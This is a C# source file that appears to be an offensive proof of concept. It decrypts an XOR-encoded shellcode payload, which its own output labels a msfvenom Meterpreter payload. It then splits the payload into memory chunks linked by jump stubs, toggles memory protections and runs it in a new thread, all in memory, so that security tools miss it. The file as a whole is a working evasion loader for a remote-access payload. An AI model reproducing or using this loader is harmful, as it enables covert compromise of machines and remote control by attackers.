using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace NativePayload_LocalCreateThread7
{
    class Program
    {
        static void Main(string[] args)
        {
            new System.Threading.Thread(() =>
            {

               
                string Payload_Encrypted = "236 88 147 244 224 248 220 16 16 16 81 65 81 64 66 88 33 194 117 88 155 66 112 65 88 155 66 8 70 88 155 66 48 88 155 98 64 88 31 167 90 90 93 33 217 88 33 208 188 44 113 108 18 60 48 81 209 217 29 81 17 209 242 253 66 81 65 88 155 66 48 155 82 44 88 17 192 118 145 104 8 27 18 31 149 98 16 16 16 155 144 152 16 16 16 88 149 208 100 119 88 17 192 64 155 88 8 84 155 80 48 89 17 192 243 70 88 239 217 93 33 217 81 155 36 152 88 17 198 88 33 208 81 209 217 29 188 81 17 209 40 240 101 225 92 19 92 52 24 85 41 193 101 200 72 84 155 80 52 89 17 192 118 81 155 28 88 84 155 80 12 89 17 192 81 155 20 152 81 72 81 72 88 17 192 78 73 74 81 72 81 73 81 74 88 147 252 48 81 66 239 240 72 81 73 74 88 155 2 249 91 239 239 239 77 89 174 103 99 34 79 35 34 16 16 81 70 89 153 246 88 145 252 176 17 16 16 89 153 245 89 172 18 16 1 76 208 184 40 120 81 68 89 153 244 92 153 225 81 170 92 103 54 23 239 197 92 153 250 120 17 17 16 16 73 81 170 57 144 123 16 239 197 122 26 81 78 64 64 93 33 217 93 33 208 88 239 208 88 153 210 88 239 208 88 153 209 81 170 250 31 207 240 239 197 88 153 215 122 0 81 72 92 153 242 88 153 233 81 170 137 181 100 113 239 197 149 208 100 26 89 239 222 101 245 248 131 16 16 16 88 147 252 0 88 153 242 93 33 217 122 20 81 72 88 153 233 81 170 18 201 216 79 239 197 147 232 16 110 69 88 147 212 48 78 153 230 122 80 81 73 120 16 0 16 16 81 72 88 153 226 88 33 217 81 170 72 180 67 245 239 197 88 153 211 89 153 215 93 33 217 89 153 224 88 153 202 88 153 233 81 170 18 201 216 79 239 197 147 232 16 109 56 72 81 71 73 120 16 80 16 16 81 72 122 16 74 81 170 27 63 31 32 239 197 71 73 81 170 101 126 93 113 239 197 89 239 222 249 44 239 239 239 88 17 211 88 57 214 88 149 230 101 164 81 239 247 72 122 16 73 89 215 210 224 165 178 70 239 197";
                string[] Payload_Encrypted_Without_delimiterChar = Payload_Encrypted.Split(' ');
                byte[] _X_to_Bytes = new byte[Payload_Encrypted_Without_delimiterChar.Length];
                for (int i = 0; i < Payload_Encrypted_Without_delimiterChar.Length; i++)
                {
                    byte current = Convert.ToByte(Payload_Encrypted_Without_delimiterChar[i].ToString());
                    _X_to_Bytes[i] = current;
                }
                IntPtr ProcessHandle2 = OpenProcess(0x001F0FFF, false, System.Diagnostics.Process.GetCurrentProcess().Id);
                Console.WriteLine();
                uint AddressOfPayload_In_Mem = VirtualAllocExNuma(ProcessHandle2, IntPtr.Zero, (uint)_X_to_Bytes.Length, 0x1000, 0x40, 0);
                RtlMoveMemory(AddressOfPayload_In_Mem, _X_to_Bytes, (uint)_X_to_Bytes.Length);
                Console.WriteLine("[!] Encrypted payload write to Part2 [startaddr + part2] for MemoryAddress of Thread.Result[" + (AddressOfPayload_In_Mem + ((uint)_X_to_Bytes.Length / 2)).ToString("X8") + "]");
                Console.WriteLine("[!] Encrypted payload write to Part1 [startaddr] for MemoryAddress of Thread.Result[" + (AddressOfPayload_In_Mem).ToString("X8") + "]");
                Console.WriteLine("[!] New Thread will Create with StartAddress VirtualAlloc.Result[" + AddressOfPayload_In_Mem.ToString("X8") + "]");
                IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; IntPtr pinfo = IntPtr.Zero;
                VirtualProtectEx(ProcessHandle2, (IntPtr)AddressOfPayload_In_Mem, (UIntPtr)_X_to_Bytes.Length, 0x04, out uint _);
                Console.WriteLine("[!] Protection Mode in Memory set to 0x20 Read_Execute, StartAddress.Result[" + AddressOfPayload_In_Mem.ToString("X8") + "]");
                /// execute native code in memory via create local thread
                hThread = CreateThread(0, 0, (IntPtr)AddressOfPayload_In_Mem, pinfo, 0x00000004, ref threadId);
                Console.WriteLine("[!] New Thread Created with ThreadId.Result[" + Convert.ToInt32(threadId) + "]");
                Console.WriteLine("[!] New Thread Created with HandleAddress_of_Thread.Result[" + hThread.ToString("X8") + "]");
                Console.WriteLine("[!] first, section two [part2] of encrypted payload will decrypt in Memory");
                Console.WriteLine("[!] after delay, then section one [part1] of encrypted payload will decrypt in Memory");

               // System.Threading.Thread.Sleep(30000);
                /////
                VirtualProtectEx(ProcessHandle2, (IntPtr)AddressOfPayload_In_Mem, ((UIntPtr)_X_to_Bytes.Length), 0x04, out uint _);
                byte[] cunck_Payload_Encrypted_Without_delimiterChar2 = new byte[_X_to_Bytes.Length];
                ReadProcessMemory(Process.GetCurrentProcess().Handle, AddressOfPayload_In_Mem,
                 cunck_Payload_Encrypted_Without_delimiterChar2, cunck_Payload_Encrypted_Without_delimiterChar2.Length, IntPtr.Zero);
                byte[] chunk_Final_Payload2 = Xor(cunck_Payload_Encrypted_Without_delimiterChar2, new byte[] { 0x10 });
                List<byte[]> all_chunks = new List<byte[]>();
                Int32 counter = 0;
                uint AddressOfPayload_In_MemX = 0;
                byte[] tmp = new byte[10] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
                int ctr = 0;
                int currentid = 0;
                foreach (var item in chunk_Final_Payload2)
                {
                    if (ctr <= 9)
                    {
                        tmp[ctr] = item;

                        ctr++;
                        currentid++;
                    }
                    else
                    {
                        all_chunks.Add(tmp);
                        ctr = 0;
                        tmp = new byte[10] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
                        tmp[ctr] = item;

                        ctr++;
                        currentid++;
                    }
                   
                    
                }
 
                uint chunk_addr00 = AddressOfPayload_In_Mem + ((uint) 700);
                byte[] jmpBytes0 = new byte[] { 0xf9, 0xf9, 0xf9, 0xb8, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
                byte[] addressBytes0 = BitConverter.GetBytes((int)chunk_addr00);
                jmpBytes0[4] = addressBytes0[0];
                jmpBytes0[5] = addressBytes0[1];
                jmpBytes0[6] = addressBytes0[2];
                jmpBytes0[7] = addressBytes0[3];
                RtlMoveMemory(AddressOfPayload_In_Mem, jmpBytes0, (uint)jmpBytes0.Length);
                bool init = false;
                uint xadr = 0;
                xadr += AddressOfPayload_In_Mem + ((uint)700);
                uint next_address = 0;
                bool initaddress = true;
                uint initaddressDetected = 0;
                int numberofpayload = 0;
                List<byte[]> jmpaddr_execution_jmp_code = new List<byte[]>();
                List<uint> jmpaddr_uintaddress = new List<uint>();
                foreach (byte[] item in all_chunks)
                {                 
                    AddressOfPayload_In_MemX = VirtualAllocExNuma(ProcessHandle2, IntPtr.Zero, (uint)item.Length, 0x1000, 0x40, 0);
                    
                    
                    byte[] _jmpBytes_run = new byte[] { 0xf9, 0xf9, 0xf9, 0xb8, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
                    byte[] _addressBytes0_run = BitConverter.GetBytes((int)AddressOfPayload_In_MemX + (uint)128);
                    _jmpBytes_run[4] = _addressBytes0_run[0];
                    _jmpBytes_run[5] = _addressBytes0_run[1];
                    _jmpBytes_run[6] = _addressBytes0_run[2];
                    _jmpBytes_run[7] = _addressBytes0_run[3];

                    jmpaddr_execution_jmp_code.Add(_jmpBytes_run);
                    jmpaddr_uintaddress.Add(AddressOfPayload_In_MemX);
                   
                    RtlMoveMemory(AddressOfPayload_In_MemX, item, (uint)item.Length);
                    if (numberofpayload < 3) 
                    Console.WriteLine("[>] Injecting/setting Chunk Address via Jmp Bytes {0} ==> into Startaddress {1}, Msfvenom Payload Bytes[{2}...]" , BitConverter.ToString(_jmpBytes_run) , AddressOfPayload_In_MemX.ToString("x8")  , BitConverter.ToString(item));
                    if (initaddress)
                    {
                        initaddressDetected = AddressOfPayload_In_MemX;
                    }
                    numberofpayload++;
                    if(numberofpayload == all_chunks.Count)
                    {
                        //0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5
                        RtlMoveMemory(AddressOfPayload_In_MemX + (uint)item.Length, new byte []{ 0x59, 0x49, 0xc7, 0xc2, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5 }, (uint)10);
                    }
                    initaddress = false;
                  
                }

                for (int i = 0; i < jmpaddr_uintaddress.Count; i++)
                {
                    if (i == 49) break;
                    RtlMoveMemory(jmpaddr_uintaddress[i] + (uint) 10, jmpaddr_execution_jmp_code[i + 1], 10);
                }
                Console.WriteLine("[!] Memory Address Detected to Init to run Result.[{0}", initaddressDetected.ToString("x8")+"]");                
              
                VirtualProtectEx(ProcessHandle2, (IntPtr)AddressOfPayload_In_Mem, ((UIntPtr)_X_to_Bytes.Length), 0x04, out uint _);
                Console.WriteLine("[!] Protection Mode in Memory set to 0x04 Read_Write, StartAddress.Result[" + AddressOfPayload_In_Mem.ToString("X8") + "]");
                System.Threading.Thread.Sleep(2500);                               
                Console.WriteLine("[!] Decrypted/write via read Part1 for MemoryAddress of Thread.Result[" + (AddressOfPayload_In_Mem).ToString("X8") + "]");                
                VirtualProtectEx(ProcessHandle2, (IntPtr)AddressOfPayload_In_Mem, (UIntPtr)_X_to_Bytes.Length, 0x40, out uint _);
                Console.WriteLine("[!] Protection Mode in Memory set to 0x40 Read_Write_Execute, StartAddress.Result[" + AddressOfPayload_In_Mem.ToString("X8") + "]");
                System.Threading.Thread.Sleep(6000);
                uint initrun = jmpaddr_uintaddress[0];
                byte[] jmpBytes_run = new byte[] { 0xf9, 0xf9, 0xf9, 0xb8, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
                byte[] addressBytes0_run = BitConverter.GetBytes((int)initrun);
                jmpBytes_run[4] = addressBytes0_run[0];
                jmpBytes_run[5] = addressBytes0_run[1];
                jmpBytes_run[6] = addressBytes0_run[2];
                jmpBytes_run[7] = addressBytes0_run[3];
             
                uint inittorun = VirtualAllocExNuma(ProcessHandle2, IntPtr.Zero, (uint)jmpBytes_run.Length, 0x1000, 0x40, 0);
                Console.WriteLine("[>] New Thread Created to Init to Jump/Exec, with StartAddress Result.[{0}", inittorun.ToString("x8") + "]");
                RtlMoveMemory(inittorun, jmpBytes_run, (uint)jmpBytes_run.Length);
                byte[] opsx = new byte[] {0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9,
                0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9 ,0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9,
                0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9 ,0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9,
                0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9 ,0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9,
                0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9 };
                RtlMoveMemory(jmpaddr_uintaddress[0], opsx,(uint) opsx.Length);
                RtlMoveMemory(jmpaddr_uintaddress[0]+ (uint)opsx.Length, jmpaddr_execution_jmp_code[1], (uint)chunk_Final_Payload2.Length);
                RtlMoveMemory(jmpaddr_uintaddress[1], opsx, (uint)opsx.Length);
                RtlMoveMemory(jmpaddr_uintaddress[1] + (uint)opsx.Length, chunk_Final_Payload2, (uint)chunk_Final_Payload2.Length / 2);
                RtlMoveMemory(jmpaddr_uintaddress[1] + ((uint)chunk_Final_Payload2.Length / 2 + (uint)opsx.Length), jmpaddr_execution_jmp_code[2],(uint) jmpaddr_execution_jmp_code[1].Length);
                byte[] test = new byte[chunk_Final_Payload2.Length / 2];
                for (int i = 0; i < test.Length; i++)
                {
                    test[i] = chunk_Final_Payload2[i + (chunk_Final_Payload2.Length / 2)];

                }
                RtlMoveMemory(jmpaddr_uintaddress[2], opsx, (uint)opsx.Length);
                RtlMoveMemory(jmpaddr_uintaddress[2]+ (uint)opsx.Length, test, (uint)test.Length);
                uint threadId2 = 0;
                IntPtr hThread2 = CreateThread(0, 0, (IntPtr)inittorun, pinfo, 0x0, ref threadId2);
                // ResumeThread(hThread);

                // VirtualProtectEx(ProcessHandle2, (IntPtr)AddressOfPayload_In_Mem, (UIntPtr)_X_to_Bytes.Length, 0x10, out uint _);
                Console.WriteLine("[!] Protection Mode in Memory set to 0x10 Execute, StartAddress.Result[" + AddressOfPayload_In_Mem.ToString("X8") + "]");
                Console.WriteLine("\nBingo: Meterpreter Session via Chunking Payload in-memory  ;)");
                WaitForSingleObject(hThread2, 0xFFFFFFFF);
            }).Start();
        }
        public static byte[] Xor(byte[] cipher, byte[] key)
        {
            byte[] xored = new byte[cipher.Length];

            for (int i = 0; i < cipher.Length; i++)
            {
                xored[i] = (byte)(cipher[i] ^ key[i % key.Length]);
            }

            return xored;
        }

        [Flags]
        public enum AllocationType
        { Commit = 0x00001000 }

        [Flags]
        public enum MemoryProtection
        {
            EXECUTE = 0x10,
            EXECUTE_READ = 0x20,
            EXECUTE_READWRITE = 0x40,
            EXECUTE_WRITECOPY = 0x80,
            NOACCESS = 0x01,
            READONLY = 0x02,
            READWRITE = 0x04,
            WRITECOPY = 0x08
        }


        [DllImport("ke" + "rne" + "l" + "32.dll")]
        public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadProcessMemory(IntPtr hProcess, uint lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, IntPtr lpNumberOfBytesRead);
        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("ntdll.dll")]
        private static extern bool RtlMoveMemory(uint addr, byte[] pay, uint size);

        //[DllImport("kernel32")]
        //public static extern uint VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32")]
        public static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
        [DllImport("kernel32")]
        public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        /// https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocexnuma
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern uint VirtualAllocExNuma(
                IntPtr hProcess,
                IntPtr lpAddress,
                uint dwSize,
                UInt32 flAllocationType,
                UInt32 flProtect,
                UInt32 nndPreferred);
        //[DllImport("kernel32.dll", SetLastError = true)]
        //public static extern bool WriteProcessMemory(IntPtr hProcess, uint lpBaseAddress, byte[] lpBuffer, Int32 nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

    }
}
